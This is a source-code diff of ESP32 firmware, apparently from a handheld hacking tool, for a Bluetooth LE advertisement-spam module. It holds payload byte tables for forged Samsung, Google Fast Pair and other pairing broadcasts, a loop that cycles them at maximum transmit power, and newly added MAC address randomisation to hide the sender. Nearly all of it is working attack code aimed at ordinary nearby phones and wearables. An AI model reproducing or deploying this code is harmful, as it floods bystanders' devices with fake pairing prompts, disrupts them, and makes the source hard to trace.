@@ -10,7 +10,6 @@
 #include "esp_gap_ble_api.h"
 #endif
 #include <globals.h>
-
 #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
     defined(CONFIG_IDF_TARGET_ESP32S3)
 #define MAX_TX_POWER ESP_PWR_LVL_P21
@@ -38,17 +37,43 @@ struct Station {
     uint8_t mac[6];
     bool selected;
 };
-
 enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
 
-const uint8_t IOS1[] = {
-    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
+const uint8_t IOS1[]{
+    0x02,
+    0x0e,
+    0x0a,
+    0x0f,
+    0x13,
+    0x14,
+    0x03,
+    0x0b,
+    0x0c,
+    0x11,
+    0x10,
+    0x05,
+    0x06,
+    0x09,
+    0x17,
+    0x12,
+    0x16,
 };
 
-const uint8_t IOS2[] = {
-    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24
+const uint8_t IOS2[]{
+    0x01,
+    0x06,
+    0x20,
+    0x2b,
+    0xc0,
+    0x0d,
+    0x13,
+    0x27,
+    0x0b,
+    0x09,
+    0x02,
+    0x1e,
+    0x24,
 };
-
 uint8_t *data;
 int deviceType = 0;
 
@@ -57,21 +82,107 @@ struct DeviceType {
 };
 
 const DeviceType android_models[] = {
-    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
-    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
-    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
-    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
-    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
-    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
-    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
-    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
-    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
+    {0x0001F0},
+    {0x000047},
+    {0x470000},
+    {0x00000A},
+    {0x00000B},
+    {0x00000D},
+    {0x000007},
+    {0x090000},
+    {0x000048},
+    {0x001000},
+    {0x00B727},
+    {0x01E5CE},
+    {0x0200F0},
+    {0x00F7D4},
+    {0xF00002},
+    {0xF00400},
+    {0x1E89A7},
+    {0xCD8256},
+    {0x0000F0},
+    {0xF00000},
+    {0x821F66},
+    {0xF52494},
+    {0x718FA4},
+    {0x0002F0},
+    {0x92BBBD},
+    {0x000006},
+    {0x060000},
+    {0xD446A7},
+    {0x038B91},
+    {0x02F637},
+    {0x02D886},
+    {0xF00000},
+    {0xF00001},
+    {0xF00201},
+    {0xF00209},
+    {0xF00205},
+    {0xF00305},
+    {0xF00E97},
+    {0x04ACFC},
+    {0x04AA91},
+    {0x04AFB8},
+    {0x05A963},
+    {0x05AA91},
+    {0x05C452},
+    {0x05C95C},
+    {0x0602F0},
+    {0x0603F0},
+    {0x1E8B18},
+    {0x1E955B},
+    {0x06AE20},
+    {0x06C197},
+    {0x06C95C},
+    {0x06D8FC},
+    {0x0744B6},
+    {0x07A41C},
+    {0x07C95C},
+    {0x07F426},
+    {0x054B2D},
+    {0x0660D7},
+    {0x0903F0},
+    {0xD99CA1},
+    {0x77FF67},
+    {0xAA187F},
+    {0xDCE9EA},
+    {0x87B25F},
+    {0x1448C9},
+    {0x13B39D},
+    {0x7C6CDB},
+    {0x005EF9},
+    {0xE2106F},
+    {0xB37A62},
+    {0x92ADC9},
 };
 
 const WatchModel watch_models[26] = {
-    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
-    {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
-    {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
+    {0x1A},
+    {0x01},
+    {0x02},
+    {0x03},
+    {0x04},
+    {0x05},
+    {0x06},
+    {0x07},
+    {0x08},
+    {0x09},
+    {0x0A},
+    {0x0B},
+    {0x0C},
+    {0x11},
+    {0x12},
+    {0x13},
+    {0x14},
+    {0x15},
+    {0x16},
+    {0x17},
+    {0x18},
+    {0x1B},
+    {0x1C},
+    {0x1D},
+    {0x1E},
+    {0x20},
 };
 
 const char *generateRandomName() {
@@ -83,6 +194,13 @@ const char *generateRandomName() {
     }
     randomName[len] = '\0';
     return randomName;
+}
+
+void generateRandomMac(uint8_t *mac) {
+    for (int i = 0; i < 6; i++) {
+        mac[i] = random(256);
+        if (i == 0) { mac[i] = (mac[i] | 0xF0) & 0xFE; }
+    }
 }
 
 int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
@@ -173,7 +291,21 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
         case Samsung: {
             uint8_t model = watch_models[random(26)].value;
             uint8_t Samsung_Data[15] = {
-                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
+                0x0F,
+                0xFF,
+                0x75,
+                0x00,
+                0x01,
+                0x00,
+                0x02,
+                0x00,
+                0x01,
+                0x01,
+                0xFF,
+                0x00,
+                0x00,
+                0x43,
+                (uint8_t)((model >> 0x00) & 0xFF)
             };
 #ifdef NIMBLE_V2_PLUS
             AdvData.addData(Samsung_Data, 15);
@@ -186,11 +318,20 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
         case Google: {
             const uint32_t model = android_models[rand() % android_models_count].value;
             uint8_t Google_Data[14] = {
-                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
+                0x03,
+                0x03,
+                0x2C,
+                0xFE,
+                0x06,
+                0x16,
+                0x2C,
+                0xFE,
                 (uint8_t)((model >> 0x10) & 0xFF),
                 (uint8_t)((model >> 0x08) & 0xFF),
                 (uint8_t)((model >> 0x00) & 0xFF),
-                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
+                0x02,
+                0x0A,
+                (uint8_t)((rand() % 120) - 100)
             };
 #ifdef NIMBLE_V2_PLUS
             AdvData.addData(Google_Data, 14);
@@ -200,12 +341,14 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
 #endif
             break;
         }
-        default:
+        default: {
             Serial.println("Please Provide a Company Type");
             break;
+        }
     }
 
     delete[] AdvData_Raw;
+
     return AdvData;
 }
 
@@ -213,13 +356,14 @@ void executeSpam(EBLEPayloadType type) {
     if (type == AppleJuice || type == SourApple) {
         return;
     }
+    
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    esp_base_mac_addr_set(macAddr);
 
-    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
     BLEDevice::init("");
-
     vTaskDelay(5 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-
     pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
     BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
@@ -235,7 +379,6 @@ void executeSpam(EBLEPayloadType type) {
 
     pAdvertising->stop();
     vTaskDelay(5 / portTICK_PERIOD_MS);
-
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
@@ -244,8 +387,12 @@ void executeSpam(EBLEPayloadType type) {
 }
 
 void executeCustomSpam(String spamName) {
-    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
-    BLEDevice::init("");
+    uint8_t macAddr[6];
+    for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
+    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;
+    esp_base_mac_addr_set(macAddr);
+
+    BLEDevice::init("sh4rk");
 
     vTaskDelay(5 / portTICK_PERIOD_MS);
 
@@ -254,17 +401,21 @@ void executeCustomSpam(String spamName) {
     pAdvertising = BLEDevice::getAdvertising();
 
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
+
     advertisementData.setFlags(0x06);
+
     advertisementData.setName(spamName.c_str());
 
     pAdvertising->addServiceUUID(BLEUUID("1812"));
+
     pAdvertising->setAdvertisementData(advertisementData);
 
     pAdvertising->start();
+
     vTaskDelay(20 / portTICK_PERIOD_MS);
+
     pAdvertising->stop();
     vTaskDelay(10 / portTICK_PERIOD_MS);
-
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
@@ -273,10 +424,10 @@ void executeCustomSpam(String spamName) {
 }
 
 void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
-    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
     BLEDevice::init(DeviceName);
 
     vTaskDelay(5 / portTICK_PERIOD_MS);
+
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
 
     NimBLEBeacon myBeacon;
@@ -289,6 +440,7 @@ void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId
     pAdvertising = BLEDevice::getAdvertising();
 
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
+
     advertisementData.setFlags(0x1A);
     advertisementData.setManufacturerData(myBeacon.getData());
 
@@ -302,10 +454,14 @@ void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId
 
     while (!check(AnyKeyPress)) {
         pAdvertising->start();
+
         Serial.println("Advertizing started...");
+
         vTaskDelay(20 / portTICK_PERIOD_MS);
+
         pAdvertising->stop();
         vTaskDelay(10 / portTICK_PERIOD_MS);
+
         Serial.println("Advertizing stop");
     }
 
@@ -320,20 +476,20 @@ void aj_adv(int ble_choice) {
     int count = 0;
     String spamName = "";
     if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
-
+    
     if (ble_choice == 5) {
         displayTextLine("Spam All Sequential");
         padprintln("");
         padprintln("Press ESC to stop");
-
+        
         while (1) {
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
-
+            
             int protocol = count % 7;
-
+            
             switch(protocol) {
                 case 0:
                     displayTextLine("Android " + String(count));
@@ -364,21 +520,19 @@ void aj_adv(int ble_choice) {
                     executeSpam(AppleJuice);
                     break;
             }
-
+            
             count++;
-
+            
             if (check(EscPress)) {
                 returnToMenu = true;
                 break;
             }
         }
-
-        NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+        
         BLEDevice::init("");
         vTaskDelay(100 / portTICK_PERIOD_MS);
         pAdvertising = nullptr;
         vTaskDelay(100 / portTICK_PERIOD_MS);
-
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
         esp_bt_controller_deinit();
 #else
@@ -386,7 +540,7 @@ void aj_adv(int ble_choice) {
 #endif
         return;
     }
-
+    
     while (1) {
         switch (ble_choice) {
             case 0:
@@ -419,15 +573,13 @@ void aj_adv(int ble_choice) {
         }
     }
 
-    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
     BLEDevice::init("");
     vTaskDelay(100 / portTICK_PERIOD_MS);
     pAdvertising = nullptr;
     vTaskDelay(100 / portTICK_PERIOD_MS);
-
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
+    esp_bt_controller_deinit();
 #else
-        BLEDevice::deinit();
+    BLEDevice::deinit();
 #endif
 }
